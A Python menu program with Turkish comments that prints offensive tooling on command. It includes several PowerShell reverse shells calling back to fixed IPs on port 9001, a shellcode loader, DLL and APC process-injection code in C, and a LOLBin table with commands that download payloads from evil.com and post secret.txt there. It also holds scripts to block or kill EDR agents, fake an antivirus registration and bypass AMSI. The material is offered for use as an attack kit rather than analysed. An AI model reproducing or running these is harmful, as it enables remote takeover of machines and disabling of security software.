# -*- coding: utf-8 -*-
import os 
# Dosya adı
malware = '''
$LHOST = "192.168.1.48"
$LPORT = 9001

# 🛑 Defender’ın algıladığı TCP bağlantısını C# ile çözüyoruz!
Add-Type -TypeDefinition @"
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

public class RevShell {
    public static void Connect() {
        string host = "$LHOST";
        int port = $LPORT;
        
        try {
            TcpClient client = new TcpClient(host, port);
            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };

            string cmd;
            while ((cmd = reader.ReadLine()) != null) {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();

                writer.WriteLine(proc.StandardOutput.ReadToEnd());
                writer.WriteLine(proc.StandardError.ReadToEnd());
            }
            
            client.Close();
        } catch (Exception) { }
    }
}
"@ -Language CSharp

# 🛑 PowerShell Reverse Shell için AMSI'den saklanıyoruz
$TCPClient = New-Object Net.Sockets.TCPClient
$TCPClient.Connect($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true

$Buffer = New-Object System.Byte[] 1024

while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
    }
    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
        $StreamWriter.Write("$Output`n")
        $Code = $null
    }
}

$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()
'''


malware2 = '''$X1 = "10.10.10.10"; $X2 = 9001; $A = New-Object Net.Sockets.TCPClient($X1, $X2); $B = $A.GetStream(); $C = New-Object IO.StreamReader($B); $D = New-Object IO.StreamWriter($B); $D.AutoFlush = $true; $E = New-Object System.Byte[] 1024; $F = $null; $G = $null; $Z = $true; while ($A.Connected -and $Z -eq $true) { $H = $A.Connected; if ($H) { while ($B.DataAvailable) { $I = $B.Read($E, 0, $E.Length); $J = ([text.encoding]::UTF8).GetString($E, 0, $I - 1); if ($J.Length -gt 0) { $G = $J } } if ($G -ne $null -and $G.Length -gt 1) { $K = $null; try { $K = Invoke-Expression ($G) 2>&1 } catch { $K = $_ }; $D.Write("$K`n"); $G = $null } }; Start-Sleep -Milliseconds 50 }; $A.Close(); $B.Close(); $C.Close(); $D.Close()'''


malware3 = '''$X1 = "10.10.10.10" & set X2=9001 & powershell -Command "$A = New-Object Net.Sockets.TCPClient('$env:X1', $env:X2)"
$B = $A.GetStream() & set C=New-Object IO.StreamReader($B) & powershell -Command "$D = New-Object IO.StreamWriter($B); $D.AutoFlush = `$true"
$E = New-Object System.Byte[] 1024 & set F=$null & set G=$null & set Z=$true
cmd /c "echo Checking connection..." & powershell -Command "while (`$A.Connected -and `$Z -eq `$true) {"
cmd /c "set H=%A.Connected%" & powershell -Command "if (`$H) { while (`$B.DataAvailable) {"
$I = $B.Read($E, 0, $E.Length) & cmd /c "set J=[text.encoding]::UTF8.GetString($E, 0, $I - 1)"
cmd /c "if NOT %J%=='' set G=%J%"
powershell -Command "if (`$G -ne `$null -and `$G.Length -gt 1) { `$K = `$null; try { `$K = Invoke-Expression (`$G) 2>&1 } catch { `$K = `$_ }; `$D.Write(`"$K`n`"); `$G = `$null } }"
cmd /c "timeout /t 1 >nul"
powershell -Command "$A.Close(); $B.Close(); $C.Close(); $D.Close()"
'''

malware4 = '''$X1 = "10.10.10.10"; $X2 = 9001
$A = New-Object Net.Sockets.TCPClient($X1, $X2)
$B = $A.GetStream()
$C = New-Object IO.StreamReader($B)
$D = New-Object IO.StreamWriter($B)
$D.AutoFlush = $true
$E = New-Object System.Byte[] 1024
$F = $null
$G = $null
$Z = $true

while ($A.Connected -and $Z -eq $true) {
    $H = $A.Connected
    if ($H) {
        while ($B.DataAvailable) {
            $I = $B.Read($E, 0, $E.Length)
            
            # JavaScript ile String Decode
            $J = cmd /c "cscript //Nologo /E:JScript" <<< @"
            var bytes = new ActiveXObject('Scripting.FileSystemObject').OpenTextFile('php://stdin', 1).ReadAll();
            WScript.Echo(bytes);
"@            
            if ($J.Length -gt 0) { $G = $J }
        }

        if ($G -ne $null -and $G.Length -gt 1) {
            $K = $null
            try {
                # PowerShell Komutunu JavaScript'e Gönderme
                $K = cmd /c "cscript //Nologo /E:JScript" <<< @"
                var shell = new ActiveXObject('WScript.Shell');
                var exec = shell.Exec('powershell -Command "Invoke-Expression (`"$G`")"');
                WScript.Echo(exec.StdOut.ReadAll());
"@
            } catch { $K = $_ }
            $D.Write("$K`n")
            $G = $null
        }
    }
    Start-Sleep -Milliseconds 50
}

$A.Close()
$B.Close()
$C.Close()
$D.Close()
'''

malware5 = '''Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ShellcodeExecutor
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint INFINITE = 0xFFFFFFFF;

    public static void ExecuteShellcode()
    {
        byte[] shellcode = new byte[]
        {
            0x90, 0x90, 0x90 // NOP instructions (example)
            // Replace with your actual shellcode bytes
        };

        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (allocatedMemory == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAlloc failed.");
            return;
        }

        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

        uint threadId;
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadId);

        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("CreateThread failed.");
            return;
        }

        WaitForSingleObject(threadHandle, INFINITE);

        Console.WriteLine("Shellcode executed.");
    }
}
"@

[ShellcodeExecutor]::ExecuteShellcode()
'''



malware6 = '''#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    wchar_t dllPath[] = L"C:\\experiments\\evilm64.dll";

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    int pid = atoi(argv[1]);
    printf("DLL injection to PID: %d\n", pid);

    // Open the process with full access
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (processHandle == NULL) {
        printf("Failed to open process.\n");
        return 1;
    }

    // Allocate memory in the remote process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, wcslen(dllPath) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Memory allocation failed.\n");
        CloseHandle(processHandle);
        return 1;
    }

    // Write the DLL path to the allocated memory
    SIZE_T bytesWritten;
    if (WriteProcessMemory(processHandle, remoteBuffer, dllPath, wcslen(dllPath) * sizeof(wchar_t), &bytesWritten) == 0) {
        printf("Failed to write memory.\n");
        CloseHandle(processHandle);
        return 1;
    }

    // Get the address of LoadLibraryW function in kernel32.dll
    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (loadLibraryAddr == NULL) {
        printf("Failed to get LoadLibraryW address.\n");
        CloseHandle(processHandle);
        return 1;
    }

    // Create the remote thread to execute LoadLibraryW in the target process
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteBuffer, 0, NULL);
    if (remoteThread == NULL) {
        printf("Failed to create remote thread.\n");
        CloseHandle(processHandle);
        return 1;
    }

    printf("DLL injected successfully.\n");

    // Close the process handle and clean up
    CloseHandle(remoteThread);
    CloseHandle(processHandle);
    return 0;
}
'''
malware7 = '''#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char buf[] = "shellcode";  // Replace with your actual shellcode
#define SHELLCODE_SIZE sizeof(buf)

int main() {
    // Take a snapshot of all processes and threads in the system
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed\n");
        return 1;
    }

    // Process Entry structure
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Iterate through all processes
    if (Process32First(snapshot, &processEntry)) {
        do {
            // Skip explorer.exe processes
            if (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
                printf("Found Process: %ws\n", processEntry.szExeFile);

                // Open the process with full access
                HANDLE victim = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
                if (victim == NULL) {
                    printf("OpenProcess failed\n");
                    continue;
                }

                // Allocate memory in the target process
                LPVOID shellAddress = VirtualAllocEx(victim, NULL, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (shellAddress == NULL) {
                    printf("VirtualAllocEx failed\n");
                    CloseHandle(victim);
                    continue;
                }

                // Write the shellcode into the allocated memory
                if (!WriteProcessMemory(victim, shellAddress, buf, SHELLCODE_SIZE, NULL)) {
                    printf("WriteProcessMemory failed\n");
                    VirtualFreeEx(victim, shellAddress, 0, MEM_RELEASE);
                    CloseHandle(victim);
                    continue;
                }

                // Iterate through all threads in the target process
                THREADENTRY32 threadEntry;
                threadEntry.dwSize = sizeof(THREADENTRY32);
                if (Thread32First(snapshot, &threadEntry)) {
                    do {
                        if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                            HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                            if (threadHandle) {
                                // Queue the APC (Asynchronous Procedure Call) to execute the shellcode
                                QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, 0);
                                CloseHandle(threadHandle);
                            }
                        }
                    } while (Thread32Next(snapshot, &threadEntry));
                }

                // Cleanup
                VirtualFreeEx(victim, shellAddress, 0, MEM_RELEASE);
                CloseHandle(victim);
            }
        } while (Process32Next(snapshot, &processEntry));
    } else {
        printf("Process32First failed\n");
    }

    // Cleanup
    CloseHandle(snapshot);

    return 0;
}
'''
# Kullanım komutları
kullani = '''
/set (malware) !
/malwares !
/lolbin !
/connect !
/avbypass !
/create !
/bypass !
'''
   
lolbin = ''' 
yürütme (Execution) Amaçlı LOLBin’ler
LOLBin	Açıklama	Örnek Kullanım
mshta.exe	HTML uygulamaları çalıştırır	mshta http://evil.com/payload.hta
rundll32.exe	DLL dosyalarını çalıştırır	rundll32.exe evil.dll,EntryPoint
powershell.exe	Güçlü komut çalıştırma aracı	powershell -EncodedCommand <Base64>
wscript.exe	VBScript çalıştırır	wscript.exe script.vbs
cscript.exe	Komut satırından VBScript çalıştırır	cscript.exe script.vbs
wmic.exe	WMI sorguları & komutları çalıştırır	wmic process call create "calc.exe"

Dosya İndirme (Download) Amaçlı
LOLBin	Açıklama	Örnek Kullanım
certutil.exe	Sertifika aracı ama dosya indirebilir	certutil -urlcache -split -f http://evil.com/payload.exe
bitsadmin.exe	Dosya indirip görev zamanlayabilir	bitsadmin /transfer evil http://evil.com/payload.exe C:\payload.exe
powershell.exe	Web'den veri çekebilir	powershell -command "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','payload.exe')"

Gizleme / Savunma Atlama (Defense Evasion)
LOLBin	Açıklama	Örnek Kullanım
regsvr32.exe	COM kayıt işlemi, script çalıştırabilir	regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
msiexec.exe	MSI yükleyicisi, uzak bağlantı ile kullanılabilir	msiexec /i http://evil.com/evil.msi
forfiles.exe	Dosya işlemleri, komut çalıştırabilir	forfiles /p C:\ /m *.txt /c "cmd /c calc.exe"
installutil.exe	.NET assembly çalıştırabilir	installutil.exe /logfile= /LogToConsole=false /U payload.dll


LOLBin	Açıklama	Örnek Kullanım
ftp.exe	FTP üzerinden dosya gönderimi	ftp -s:script.txt
powershell.exe	Web'e veri POST edebilir	powershell Invoke-WebRequest -Uri http://evil.com -Method POST -Body (Get-Content secret.txt)
'''
amac = '''Malware 1 (PowerShell Reverse Shell)

    Kullanım Amacı: Uzak bir hedefe PowerShell reverse shell bağlantısı kurarak komutları çalıştırma. AMSI (Antimalware Scan Interface) bypass teknikleri içerir.

Malware 2 (PowerShell Reverse Shell)

    Kullanım Amacı: Reverse shell için PowerShell kullanarak hedef makineye uzaktan erişim sağlar. Komutları uzaktan çalıştırır.

Malware 3 (PowerShell Reverse Shell)

    Kullanım Amacı: Benzer şekilde PowerShell reverse shell kullanarak uzak bağlantılar kurar. Çeşitli evrimsel formattaki kodlar, hedef makineleri kontrol etmeyi sağlar.

Malware 4 (PowerShell Reverse Shell + JavaScript)

    Kullanım Amacı: PowerShell ve JavaScript kombinasyonu kullanarak hedef sistemde shell komutları çalıştırma ve şifreli komutları aktarma.

Malware 5 (Shellcode Executor in C#)

    Kullanım Amacı: C# kullanarak shellcode çalıştırma. Shellcode’u hedef sistemde çalıştırmak için bellek tahsisi ve uzaktan iş parçacığı oluşturma işlemi yapar.

Malware 6 (DLL Injection in C)

    Kullanım Amacı: Bir DLL dosyasını hedef bir süreç içinde enjekte ederek, hedefin işlevselliğini değiştirmek ve kontrol sağlamak.

Malware 7 (Process and Thread Injection in C)

    Kullanım Amacı: Hedef süreçlerde shellcode çalıştırmak amacıyla bellek ayırma ve işlem / thread enjekte etme işlemi yapar. Bu shellcode'u yürütmek için hedef süreçlerin iş parçacıklarını kullanır.'''


avbypass = r'''
EDR bypass:
🔥 Alternatif: PowerShell ile netsh Kullanarak IP Bazlı Egress Engelleme
$ip = "198.51.100.45"; $rule = "block_edr"; Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs

-------------------------------------
🎭 Daha Gizli Versiyon (Script Block Logging vs Bypass için encoded payload):

$cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc


🛡️ 3. EDR DLL Load'larını Etkin Süreçte İzleme ve Kapatma (Sysmon / Event 7 Gibi)

EDR’ye ait DLL’lerin hangi süreçlere yüklendiğini görüp, PowerShell ile dinamik olarak bunları suspend veya unload etmeye çalışmak:
$edrDll = "edrhook.dll"; Get-Process | ForEach-Object { try { $modules = $_.Modules; foreach ($mod in $modules) { if ($mod.ModuleName -like "*$edrDll*") { Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"; Stop-Process -Id $_.Id -Force } } } catch { Write-Host "[!] Hata: $($_.Exception.Message)" } }

🧨 2. Advanced API-based Suspend (Low-Level Native)

Bu yöntem, ntdll.dll üzerinden NtSuspendProcess çağrısı yapar. Gelişmiş EDR’ler bu çağrıyı yakalayabilir ama API call stack çok daha düşük seviye olduğu için bazı sistemlerde çalışabilir.

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class PsSuspend {
    [DllImport("ntdll.dll")]
    public static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inheritHandle, int processId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
"@

$target = Get-Process | Where-Object { $_.Name -like "*edr*" } | Select-Object -First 1

if ($target) {
    $procId = $target.Id
    $access = 0x0800
    $handle = [PsSuspend]::OpenProcess($access, $false, $procId)

    if ($handle -ne [IntPtr]::Zero) {
        [PsSuspend]::NtSuspendProcess($handle) | Out-Null
        [PsSuspend]::CloseHandle($handle) | Out-Null
        Write-Host "[+] Süreç askıya alındı: $($target.Name) (PID: $procId)"
    } else {
        Write-Host "[-] Process handle alınamadı. Yetki yetersiz olabilir."
    }
}




counter-EDR:

New-Item -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" -Force

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
  -Name "DisplayName" -Value "UltraSecureX Antivirus"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
  -Name "PathToSignedProductExe" -Value "C:\UltraSecureX\securex.exe"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
  -Name "ProductState" -Value 0x00001000

# Remove existing EDR entries
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\" | ForEach-Object {
    $val = Get-ItemProperty $_.PSPath
    if ($val.DisplayName -like "*SentinelOne*" -or $val.DisplayName -like "*CrowdStrike*") {
        Write-Host "EDR kaydı bulundu: $($val.DisplayName)"
        Remove-Item $_.PSPath -Force
    }
}

Amsi bypass:
registry ile:
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\AMSI" -Name "Enable" -Value 0



amsi bypas with dll proxying:
# AMSI tarama fonksiyonunun değiştirilmesi
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("amsi.dll", SetLastError = true)]
    public static extern int AmsiScanBuffer(IntPtr buffer, uint length, string contentName, uint contentType, out uint result);

    // AMSI ScanBuffer fonksiyonunu proxy'liyoruz (NOP işlemi)
    public static int AmsiScanBuffer_Proxy(IntPtr buffer, uint length, string contentName, uint contentType, out uint result) {
        result = 0;  // Herhangi bir tarama yapılmıyor, sonuç başarı (0)
        return 0;  // Başarı kodu döndürüyoruz (0)
    }
}
"@ -Language CSharp

# AMSI ScanBuffer fonksiyonunu proxy yapıyoruz
[AMSI]::AmsiScanBuffer([IntPtr]::Zero, 0, "", 0, [ref]$null)

# AMSI fonksiyonlarını proxy'le
$originalAmsiScanBuffer = [AMSI]::AmsiScanBuffer
[AMSI]::AmsiScanBuffer = [AMSI]::AmsiScanBuffer_Proxy

# Artık AMSI'nin taramaları geçici olarak devre dışıdır
Write-Host "AMSI bypass edildi."

'''

yazi = '''


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣀⣀⣤⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⡿⣿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣛⣽⣿⠿⠿⢻⣿⡟⣷⣼⣉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⢏⣤⣶⣿⣿⣿⢹⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠿⣿⣇⣿⣿⣿⣿⣿⣿⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣿⣿⣿⣿⣿⣿⡿⠛⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⢿⣿⣙⣿⣿⡟⠁⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⣻⡿⠋⣹⣿⡀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠟⣹⣿⢋⣀⣿⡿⠿⠿⠷⣶⢾⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢣⣾⣿⣿⣿⣿⡿⠿⠿⣿⣶⣦⣼⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⠋⠉⢛⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣷⣰⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠁⠀⣿⣿⣯⣼                            
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⡿⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⡿⣿⣿⣧⣬⣥⣴⡿⠿⣻⣧⠀                                                                                                                            ⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣹⣿⣿⣿⣾⠋⠉⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢸⣿⣿⣿⣭⣦⣤⣤⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣴⢟⣿⡿⢻⣿⣿⣿⣿
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⡿⣳⣿⣿⡟⢻⣿⣿
⢿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣿⣿⡿⠇⠸⠿
⠀⠉⠙⠛⠛⠛⠛⠛⢛⣿⣿⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⣦⣀⣀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠉⠉⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


 
 
__________           .___       .__                                                       
\______   \ ____   __| _/_  _  _|__| ____  
 |       _// __ \ / __ |\ \/ \/ /  |/    \                                            
 |    |   \  ___// /_/ | \     /|  |   |  \
 
 
 
 -------------------------------------------
                                                                   
'''

# Kullanıcıdan komut al
print(yazi)
print(kullani)


# Kullanıcı 'set malwares' komutunu girerse dosyayı yazdır
while True:  # Sonsuz döngü başlatıyoruz
    yaz = input('Komutu girin: ')  # Kullanıcıdan komut al

    # Komutlara göre işlem yapılır
    if yaz.strip() == '/set malware':
        print(malware)
    elif yaz == '/set malware2':
        print(malware2)
    elif yaz.strip() == '/set malware3':
        print(malware3)
    elif yaz == '/set malware4':
        print(malware4)
    elif yaz == '/set malware5':
        print(malware5)
    elif yaz == '/set malware6':
        print(malware6)
    elif yaz == '/set malware7':
        print(malware7)
    elif yaz == '/set malware8':
        print(malware8)
    elif yaz == '/bypass':
        os.system('python3 bypass.py')
    elif yaz == '/create':
        os.system('python3 virusoluşturucu.py')
    elif yaz == '/lolbin':
        print(lolbin)
    elif yaz == '/connect':
        os.system('python3 connect.py')
    elif yaz == '/malwares':
        print(amac)
    elif yaz == '/avbypass':
        print(avbypass)
    elif yaz.strip().lower() == 'exit':  # 'exit' komutu ile döngüden çıkılır
        print("Program kapatılıyor...")
        break  # Döngüyü sonlandırır ve programı kapatır
    else:
        print('Geçersiz komut!')  # Geçersiz komut girildiğinde hata mesajı
